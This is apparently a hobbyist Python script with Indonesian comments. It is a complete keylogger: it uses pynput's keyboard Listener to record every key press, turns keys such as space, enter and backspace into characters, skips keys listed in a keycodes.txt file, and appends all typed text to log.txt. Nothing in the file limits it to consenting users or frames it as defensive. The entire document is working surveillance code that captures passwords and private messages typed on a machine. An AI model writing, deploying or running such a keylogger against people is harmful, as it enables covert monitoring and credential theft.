# f = open("log.txt", "a")
# f.write("\nberhasil")
# f.close()

from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    # Membuka file "keycodes.txt" untuk membaca daftar keycodes
    with open("keycodes.txt", 'r') as codes:
        # Membaca setiap baris dari file
        for line in codes:
            # Menghapus karakter kosong dari awal dan akhir baris
            line = line.strip()
            # Memeriksa apakah nilai letter cocok dengan baris
            if line == letter:
                # Jika cocok, ubah nilai letter menjadi spasi
                letter = ' '
                break  # Hentikan pencarian setelah menemukan kecocokan

    if letter == "Key.space":
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.backspace':
        letter = '/'
    if letter == 'Key.shift':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    
    # print (letter)
    with open("log.txt", 'a') as f:
        f.write(letter)
    # print("Key pressed:", letter)  # Tambahkan baris ini

with Listener(on_press=write_to_file) as l:
    l.join()
# r = reading
# w = writing
# a = apending to file